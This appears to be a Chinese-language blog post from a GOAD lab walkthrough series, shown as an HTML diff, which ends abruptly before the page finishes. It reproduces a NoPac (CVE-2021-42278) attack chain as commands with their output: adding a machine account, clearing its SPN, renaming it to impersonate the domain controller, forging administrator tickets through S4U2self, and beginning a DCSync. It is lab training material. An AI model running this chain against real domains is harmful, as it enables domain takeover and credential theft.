@@ -1,0 +1,744 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.jpg">
+  <link rel="icon" href="/img/icon.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Skyarrow">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="今天我们的目标是拿下北境。 使用的漏洞为CVE-2021-42278 (NoPac)   添加机器：你有一个普通机器账户（如 relayedpc$）。 重命名 (你的问题)：你利用 renameMachine.py (或 bloodyAD) 将 relayedpc$ 改名为 winterfell (去掉 $，让 KDC 误以为它是域控)。 请求票据：使用这个假冒的名字请求 TGT。 恢复名字：在">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从零开始的GOAD生活(中)">
+<meta property="og:url" content="http://example.com/2026/02/02/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84GOAD%E7%94%9F%E6%B4%BB-%E4%B8%AD/index.html">
+<meta property="og:site_name" content="Skyarrow&#39;s blog">
+<meta property="og:description" content="今天我们的目标是拿下北境。 使用的漏洞为CVE-2021-42278 (NoPac)   添加机器：你有一个普通机器账户（如 relayedpc$）。 重命名 (你的问题)：你利用 renameMachine.py (或 bloodyAD) 将 relayedpc$ 改名为 winterfell (去掉 $，让 KDC 误以为它是域控)。 请求票据：使用这个假冒的名字请求 TGT。 恢复名字：在">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-02-02T06:03:52.000Z">
+<meta property="article:modified_time" content="2026-02-02T10:10:00.937Z">
+<meta property="article:author" content="Skyarrow">
+<meta property="article:tag" content="GOAD">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>从零开始的GOAD生活(中) - Skyarrow&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null},"busuanzi":{"enable":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Skyarrow&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Links</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/card_normal.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="从零开始的GOAD生活(中)"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-02-02 14:03" pubdate>
+          February 2, 2026 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.7k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          23 mins
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> views
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">从零开始的GOAD生活(中)</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>今天我们的目标是拿下北境。</p>
+<p>使用的漏洞为<strong>CVE-2021-42278 (NoPac)</strong> </p>
+<blockquote>
+<p><strong>添加机器</strong>：你有一个普通机器账户（如 <code>relayedpc$</code>）。</p>
+<p><strong>重命名 (你的问题)</strong>：你利用 <code>renameMachine.py</code> (或 bloodyAD) 将 <code>relayedpc$</code> 改名为 <code>winterfell</code> (去掉 <code>$</code>，让 KDC 误以为它是域控)。</p>
+<p><strong>请求票据</strong>：使用这个假冒的名字请求 TGT。</p>
+<p><strong>恢复名字</strong>：在 TGT 到手后，迅速把名字改回 <code>relayedpc$</code> (为了防止服务票据请求失败)。</p>
+<p><strong>S4U2self</strong>：利用改名时拿到的 TGT 获取域管权限的服务票据。</p>
+</blockquote>
+<p>准备添加机器用户。</p>
+<p>查看机器账户配额</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# nxc ldap winterfell.north.sevenkingdoms.<span class="hljs-keyword">local</span> -u jon.snow -p iknownothing -d north.sevenkingdoms.<span class="hljs-keyword">local</span> -M maq<br>LDAP        <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span>   <span class="hljs-number">389</span>    WINTERFELL       [*] Windows <span class="hljs-number">10</span> / <span class="hljs-keyword">Server</span> <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> (<span class="hljs-type">name</span>:WINTERFELL) (<span class="hljs-keyword">domain</span>:north.sevenkingdoms.<span class="hljs-keyword">local</span>) (signing:<span class="hljs-keyword">None</span>) (channel binding:Never)                                                                                                                              <br>LDAP        <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span>   <span class="hljs-number">389</span>    WINTERFELL       [+] north.sevenkingdoms.<span class="hljs-keyword">local</span>\jon.snow:iknownothing <br>MAQ         <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span>   <span class="hljs-number">389</span>    WINTERFELL       [*] Getting the MachineAccountQuota<br>MAQ         <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span>   <span class="hljs-number">389</span>    WINTERFELL       MachineAccountQuota: <span class="hljs-number">10</span><br>                            <br></code></pre></td></tr></table></figure>
+
+<p>我们要做的是添加一台计算机，清除那台计算机的SPN，重命名成与DC同名的计算机，为计算机获取一个TGT，将计算机名称重置为他原来的名字，使用我们之前获得的 TGT 获得服务票证，最后 dcsync</p>
+<p>添加计算机</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# impacket-addcomputer -computer-<span class="hljs-type">name</span> <span class="hljs-string">&#x27;samaccountname$&#x27;</span> -computer-pass <span class="hljs-string">&#x27;ComputerPassword&#x27;</span> -dc-host winterfell.north.sevenkingdoms.<span class="hljs-keyword">local</span> -<span class="hljs-keyword">domain</span>-netbios NORTH <span class="hljs-string">&#x27;north.sevenkingdoms.local/jon.snow:iknownothing&#x27;</span><br>Impacket v0<span class="hljs-number">.14</span><span class="hljs-number">.0</span>.dev0 - Copyright Fortra, LLC <span class="hljs-keyword">and</span> its affiliated companies <br><br>[*] Successfully added machine account samaccountname$ <span class="hljs-keyword">with</span> <span class="hljs-keyword">password</span> ComputerPassword.<br><br></code></pre></td></tr></table></figure>
+
+<p>清除spn</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/dirkjanm/krbrelayx">https://github.com/dirkjanm/krbrelayx</a></p>
+<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs prolog">┌──(root㉿kaada)-[/opt/krbrelayx-master]<br>└─# python addspn.py --clear -t <span class="hljs-string">&#x27;samaccountname$&#x27;</span> -u <span class="hljs-string">&#x27;north.sevenkingdoms.local\jon.snow&#x27;</span> -p <span class="hljs-string">&#x27;iknownothing&#x27;</span> <span class="hljs-string">&#x27;winterfell.north.sevenkingdoms.local&#x27;</span><br>[-] <span class="hljs-symbol">Connecting</span> to host...<br>[-] <span class="hljs-symbol">Binding</span> to host<br>[+] <span class="hljs-symbol">Bind</span> <span class="hljs-symbol">OK</span><br>[+] <span class="hljs-symbol">Found</span> modification target<br>[+] <span class="hljs-symbol">Printing</span> object before clearing<br><span class="hljs-symbol">DN</span>: <span class="hljs-symbol">CN</span>=samaccountname,<span class="hljs-symbol">CN</span>=<span class="hljs-symbol">Computers</span>,<span class="hljs-symbol">DC</span>=north,<span class="hljs-symbol">DC</span>=sevenkingdoms,<span class="hljs-symbol">DC</span>=local - <span class="hljs-symbol">STATUS</span>: <span class="hljs-symbol">Read</span> - <span class="hljs-symbol">READ</span> <span class="hljs-symbol">TIME</span>: <span class="hljs-number">2026</span><span class="hljs-number">-02</span><span class="hljs-number">-02</span><span class="hljs-symbol">T01</span>:<span class="hljs-number">57</span>:<span class="hljs-number">32.542507</span><br>    sAMAccountName: samaccountname$<br><br>[+] <span class="hljs-symbol">SPN</span> <span class="hljs-symbol">Modified</span> successfully<br></code></pre></td></tr></table></figure>
+
+<p>重命名计算机（命名为DC的名字）</p>
+<p><a target="_blank" rel="noopener" href="https://gist.githubusercontent.com/snovvcrash/3bf1a771ea6b376d374facffa9e43383/raw/d4191e295c96bc1cfb0a54b18cfbb8b21d25b483/renameMachine.py">gist.githubusercontent.com&#x2F;snovvcrash&#x2F;3bf1a771ea6b376d374facffa9e43383&#x2F;raw&#x2F;d4191e295c96bc1cfb0a54b18cfbb8b21d25b483&#x2F;renameMachine.py</a></p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vim">┌──(root㉿kaada)-[/<span class="hljs-keyword">opt</span>/krbrelayx-master]<br>└─# <span class="hljs-keyword">python</span> renameMachine.<span class="hljs-keyword">py</span> -current-name <span class="hljs-string">&#x27;samaccountname$&#x27;</span> -<span class="hljs-keyword">new</span>-name <span class="hljs-string">&#x27;winterfell&#x27;</span> -dc-ip <span class="hljs-string">&#x27;winterfell.north.sevenkingdoms.local&#x27;</span> north.sevenkingdoms.local/jon.<span class="hljs-keyword">sno</span><span class="hljs-variable">w:iknownothing</span><br>Impacket v0.<span class="hljs-number">14.0</span>.dev0 - Copyright Fortra, LLC <span class="hljs-built_in">and</span> its affiliated companies <br><br>[*] Target machine renamed successfully!<br><br></code></pre></td></tr></table></figure>
+
+<p>获取TGT</p>
+<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs prolog">┌──(root㉿kaada)-[/opt/krbrelayx-master]<br>└─# impacket-getTGT -dc-ip <span class="hljs-string">&#x27;winterfell.north.sevenkingdoms.local&#x27;</span> <span class="hljs-string">&#x27;north.sevenkingdoms.local&#x27;</span>/<span class="hljs-string">&#x27;winterfell&#x27;</span>:<span class="hljs-string">&#x27;ComputerPassword&#x27;</span><br><span class="hljs-symbol">Impacket</span> v0<span class="hljs-number">.14</span><span class="hljs-number">.0</span>.dev0 - <span class="hljs-symbol">Copyright</span> <span class="hljs-symbol">Fortra</span>, <span class="hljs-symbol">LLC</span> and its affiliated companies <br><br>[*] <span class="hljs-symbol">Saving</span> ticket in winterfell.ccache<br><br></code></pre></td></tr></table></figure>
+
+<p>恢复计算机名</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vim">┌──(root㉿kaada)-[/<span class="hljs-keyword">opt</span>/krbrelayx-master]<br>└─# <span class="hljs-keyword">python</span> renameMachine.<span class="hljs-keyword">py</span> -current-name <span class="hljs-string">&#x27;winterfell&#x27;</span> -<span class="hljs-keyword">new</span>-name <span class="hljs-string">&#x27;samaccount$&#x27;</span> -dc-ip <span class="hljs-string">&#x27;winterfell.north.sevenkingdoms.local&#x27;</span> north.sevenkingdoms.local/jon.<span class="hljs-keyword">sno</span><span class="hljs-variable">w:iknownothing</span><br>Impacket v0.<span class="hljs-number">14.0</span>.dev0 - Copyright Fortra, LLC <span class="hljs-built_in">and</span> its affiliated companies <br><br>[*] Target machine renamed successfully!<br>                                                      <br></code></pre></td></tr></table></figure>
+
+<p><strong>利用getST.py</strong> 通过S4U2self协议向域控请求ST</p>
+<blockquote>
+<p>S4U2Self: 服务A通过S4U2Self协议，可以从域服务器获取账号B访问应用服务器A的TGS票据，就像账号B主动从域服务器获取一个访问服务A的TGS票据一样。可以理解为通过该协议，可以获取域内任意账号访问服务A的TGS票据，过程中不需要账号B认证到域</p>
+</blockquote>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs routeros">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# impacket-getST -self -impersonate <span class="hljs-string">&#x27;administrator&#x27;</span> -altservice <span class="hljs-string">&#x27;CIFS/winterfell.north.sevenkingdoms.local&#x27;</span> -k -no-pass -dc-ip <span class="hljs-string">&#x27;winterfell.north.sevenkingdoms.local&#x27;</span> <span class="hljs-string">&#x27;north.sevenkingdoms.local&#x27;</span>/<span class="hljs-string">&#x27;winterfell&#x27;</span> -<span class="hljs-built_in">debug</span><br>Impacket v0.14.0.dev0 - Copyright Fortra, LLC <span class="hljs-keyword">and</span> its affiliated companies <br><br>[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket<br>[+] Using Kerberos Cache: winterfell.ccache<br>[+] Returning cached credential <span class="hljs-keyword">for</span> KRBTGT/NORTH.SEVENKINGDOMS.LOCAL@NORTH.SEVENKINGDOMS.LOCAL<br>[+] Using TGT <span class="hljs-keyword">from</span> cache<br>[+] Username retrieved <span class="hljs-keyword">from</span> CCache: winterfell<br>[*] Impersonating administrator<br>[+] AUTHENTICATOR<br>Authenticator:<br> <span class="hljs-attribute">authenticator-vno</span>=5<br> <span class="hljs-attribute">crealm</span>=NORTH.SEVENKINGDOMS.LOCAL<br> <span class="hljs-attribute">cname</span>=PrincipalName:<br>  <span class="hljs-attribute">name-type</span>=1<br>  <span class="hljs-attribute">name-string</span>=SequenceOf:<br>   winterfell<br><br> <span class="hljs-attribute">cusec</span>=970874<br> <span class="hljs-attribute">ctime</span>=20260202071620Z<br><br><br><br>[+] S4UByteArray<br> 0000   01 00 00 00 61 64 6D 69  6E 69 73 74 72 61 74 6F   <span class="hljs-built_in">..</span><span class="hljs-built_in">..</span>administrato<br> 0010   72 6E 6F 72 74 68 2E 73  65 76 65 6E 6B 69 6E 67   rnorth.sevenking<br> 0020   64 6F 6D 73 2E 6C 6F 63  61 6C 4B 65 72 62 65 72   doms.localKerber<br> 0030   6F 73                                              os<br>[+] CheckSum<br> 0000   C0 71 1D B8 6B C8 F2 05  F1 B8 C4 4A D2 39 87 00   .q<span class="hljs-built_in">..</span>k<span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span>J.9<span class="hljs-built_in">..</span><br>[+] PA_FOR_USER_ENC<br>PA_FOR_USER_ENC:<br> <span class="hljs-attribute">userName</span>=PrincipalName:<br>  <span class="hljs-attribute">name-type</span>=1<br>  <span class="hljs-attribute">name-string</span>=SequenceOf:<br>   administrator<br><br> <span class="hljs-attribute">userRealm</span>=north.sevenkingdoms.local<br> <span class="hljs-attribute">cksum</span>=Checksum:<br>  <span class="hljs-attribute">cksumtype</span>=-138<br>  <span class="hljs-attribute">checksum</span>=0xc0711db86bc8f205f1b8c44ad2398700<br><br> <span class="hljs-attribute">auth-package</span>=Kerberos<br><br>[+] Final TGS<br>TGS_REQ:<br> <span class="hljs-attribute">pvno</span>=5<br> <span class="hljs-attribute">msg-type</span>=12<br> <span class="hljs-attribute">padata</span>=SequenceOf:<br>  PA_DATA:<br>   <span class="hljs-attribute">padata-type</span>=1<br>   <span class="hljs-attribute">padata-value</span>=0x6e82051a30820516a003020105a10302010ea20703050000000000a382047c6182047830820474a003020105a11b1b194e4f5254482e534556454e4b494e47444f4d532e4c4f43414ca22e302ca003020101a12530231b066b72627467741b194e4f5254482e534556454e4b494e47444f4d532e4c4f43414ca382041e3082041aa003020112a103020102a282040c0482040817500a4b11c4fe9ff3ccf0d5bb07e1c3fb9ba650646cae5d2c7df8f447e4cf1f238d03acc4ab3f36460d13be916bee5132977867d2e41c529976d2c8c39f8dd2040d7ff3c39909c31dfe0de221617d36a7b01ecaa7cfd0ebb6f15c8a1bfdd992ec3f7702ec70ac6e7c2ae487ff6353b4de7e0e0b1c2727ab79092784d338d42cffe38b4d21b8cc281d75546c7b033d46e5477579e7d89c7fe02b85395c155af86b33410c16a504acc3895ce505d9ce1ce6a0f7a81c6a66ef307a7ceddab0e8bde9658d37dbf89b7020cfecbba389c044b53b96ae865bbd499e897030c025f1039a8c2d052ef5adf480792800493ef971688fb418e9b72747ffd47f7661b7eba37f3d2c508a099f6d68256e6e3d5bc4bf4c859ce4773e59cfd51ee9ad494348cc42aa37a07e594b781a0d175563f1810e5479dfa26d16ffea03640141705b3a4e9c715d9e8eb0172d5ae48813ebbac25790d9de1bb96d3f36d8a2ca97da95204af2f14aeea8c0ad8ed62473520530838d617d249c0c268e4598dc81a7df5535dea36dd2bd960b3a19ba9aed41f64013fc16c1d588fb17d372bd4d50462ec0729fa5186d91cba3b6c53f82cced9866e55b5d2eb348d84ac4ab8f491e3f285412f68a5404d3983bc616dca71483c62aa58a985ab0a2d487ff82e82887ad9b6ef90e8488c097e182f44f494cc118f27323237de236b80ca97964d1add97142bfdcb4c32a570a7f06648e7b49f35d1ea76ef9da1581146bb8f590089056c58ba01c97bbc885b229525215fe28426d9aa838e986c082fbaea320c5e94fe9071489e384ad65ca909e76f9ef4a35b5691064ef99fcf0a45d4efe4054bf052a3d9428e7ca86e7c931174c70ca1ada23e7f1c6582cd12141587a5bef7487aae9cfa147bd2f5234dd191d9c0b77dc2c26324bd1df21b338d6dfbee6e93b62b9bbfb5ae7170c552e49ca025bdab2a72eba69e7c8133c66120949176af37793c1479c0f05e61757fa0e88322a3736dc70378163754d0487dcb6022dae0e1646824ab233278a4f96bb2fb2b9d3dd521251023ef2233321c1c9ffe960775e08cbd380ddef28e4be2e8a50f0168e46ca6c29f5b60fa9f879cd4745c559eb8379bb1a035587fc8a668c162d0a9e9961df5ae956508ebd14bee6dd34dbafa4772caf96be25e783399eda06130b9bd5adac37efa78ed6f5cd2b45310d949e26191cc25173b74ef9e7713ec447d90270f24c287f90abc55e706d020e8e5b39fbea92d26455c2e5d331ca22d7914dc8a77baf8d1dc4c83de4b6dd5c9f36cc9c5470487de835164f8d10adc740f4ddb3798713d1fc04d41453850e138e743ab77c3f19237ee4ce8f5d8cf1d787056a13f530c4f91d84c6bbf29240179b6c8c261918bae467a03821ee1836073663afd90de149fb0681d9a9af887b52fe1ec5e320d5cfd889b0e180966abcde89f0fbd7a46573a48180307ea003020112a2770475a805e72b84d06ecfa4e3c06b1c21eabec9690601eb0e459ba6bea5f5ac2047272b70a67e3756e530be9084c99a6651083ddfa02cdbcc9428cfb8fc5e4fde1ed983b5107656b9d62caa5e42cf30228a37c063c4bef9d6c15465a54aaf7eba454f2db2e85faac3879abe03008afb214ce70d46bb6a5b<br>  PA_DATA:<br>   <span class="hljs-attribute">padata-type</span>=129<br>   <span class="hljs-attribute">padata-value</span>=0x3063a01a3018a003020101a111300f1b0d61646d696e6973747261746f72a11b1b196e6f7274682e736576656e6b696e67646f6d732e6c6f63616ca21c301aa0040202ff76a1120410c0711db86bc8f205f1b8c44ad2398700a30a1b084b65726265726f73<br><br> <span class="hljs-attribute">req-body</span>=KDC_REQ_BODY:<br>  <span class="hljs-attribute">kdc-options</span>=1082195968<br>  <span class="hljs-attribute">realm</span>=NORTH.SEVENKINGDOMS.LOCAL<br>  <span class="hljs-attribute">sname</span>=PrincipalName:<br>   <span class="hljs-attribute">name-type</span>=0<br>   <span class="hljs-attribute">name-string</span>=SequenceOf:<br>    winterfell<br><br>  <span class="hljs-attribute">till</span>=20260203071620Z<br>  <span class="hljs-attribute">nonce</span>=1127067172<br>  <span class="hljs-attribute">etype</span>=SequenceOf:<br>   18   23<br><br><br>[*] Requesting S4U2self<br>[+] Trying <span class="hljs-keyword">to</span> connect <span class="hljs-keyword">to</span> KDC at winterfell.north.sevenkingdoms.local:88<br>[+] Original sname is <span class="hljs-keyword">not</span> formatted as usual (i.e. CLASS/HOSTNAME), automatically filling the substitution<span class="hljs-built_in"> service </span>will fail<br>[+] Original sname is: winterfell<br>[+] <span class="hljs-literal">No</span><span class="hljs-built_in"> service </span>realm <span class="hljs-keyword">in</span> new SPN, using the current one (NORTH.SEVENKINGDOMS.LOCAL)<br>[*] Changing<span class="hljs-built_in"> service </span><span class="hljs-keyword">from</span> winterfell@NORTH.SEVENKINGDOMS.LOCAL <span class="hljs-keyword">to</span> CIFS/winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL<br>[*] Saving ticket <span class="hljs-keyword">in</span> administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache<br></code></pre></td></tr></table></figure>
+
+<p>之后利用保存的票据进行DCSync攻击</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 